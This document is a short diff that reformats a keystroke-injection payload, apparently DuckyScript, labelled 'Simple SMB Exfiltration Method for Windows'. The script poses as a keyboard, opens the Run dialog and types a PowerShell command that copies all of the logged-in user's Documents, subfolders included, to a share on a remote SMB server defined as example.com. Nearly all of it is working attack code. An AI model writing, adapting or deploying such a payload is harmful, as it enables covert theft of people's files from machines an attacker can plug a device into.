@@ -1,1 +1,16 @@
-REM Example Simple SMB Exfiltration Method for WindowsATTACKMODE HIDDELAY 2000DEFINE SMB_SERVER example.comDEFINE SMB_SHARE sharedfolderGUI rDELAY 100STRING powershell “cp -r $env:USERPROFILE\Documents\* \\STRING SMB_SERVERSTRING \STRING SMB_SHARESTRING “ENTER REM This short Powershell one-liner, executed from the Windows Run dialog, will copy all documents (including subfolders) from the currently logged in user account’s documents folder to the defined SMB share.
+REM Example Simple SMB Exfiltration Method for Windows
+ATTACKMODE HID
+DELAY 2000
+DEFINE SMB_SERVER example.com
+DEFINE SMB_SHARE sharedfolder
+GUI r
+DELAY 100
+STRING powershell "cp -r $env:USERPROFILE\Documents\* \\
+STRING SMB_SERVER
+STRING \
+STRING SMB_SHARE
+STRING "
+ENTER
+
+ 
+REM This short Powershell one-liner, executed from the Windows Run dialog, will copy all documents (including subfolders) from the currently logged in user account’s documents folder to the defined SMB share.
